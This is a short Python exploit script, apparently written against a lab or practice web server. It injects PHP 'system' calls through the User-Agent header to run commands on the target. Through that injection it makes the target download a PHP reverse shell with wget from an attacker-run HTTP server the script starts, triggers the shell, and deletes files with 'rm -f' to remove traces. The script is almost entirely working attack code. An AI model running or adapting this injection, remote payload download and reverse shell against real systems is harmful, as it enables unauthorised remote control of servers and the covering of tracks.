import requests
import _thread
from http.server import HTTPServer, SimpleHTTPRequestHandler


def server(threadName, delay):
	httpd = HTTPServer(('0.0.0.0', 8989), SimpleHTTPRequestHandler)
	httpd.serve_forever()

def get_reverse_shell():
	print("Get session : ")
	s.headers.update({'User-Agent':'<?= system("ls -ltrh ") ?>'})
	response=s.post('http://172.20.0.119:12345/reverse-shell.php',login_data)
	print(" sending session ....")
	
def upload_reverse_shell():
	print("Storing php reverse shell on  target machine ")
	s.headers.update({'User-Agent':'<?= system("wget http://10.11.12.3:8989/reverse-shell.php") ?>'})
	response=s.post('http://172.20.0.119:12345/',login_data)	


def clear():
	s.headers.update({'User-Agent':'<?= system(" rm -f reverse* ") ?>'})
	response=s.post('http://172.20.0.119:12345/',login_data)
	
print("Exploit Auser-Agent web vulnedrability ")

login_data={'password':'NoLaSabes','login':''}
s= requests.Session()

s.headers.update({'User-Agent':'<?= system("ls -ltrh") ?>'})
response=s.post('http://172.20.0.119:12345/',login_data)
clear()

print(response.text)

print("Launch local server: ")
_thread.start_new_thread( server,('Thread-1',1))
upload_reverse_shell()
get_reverse_shell()
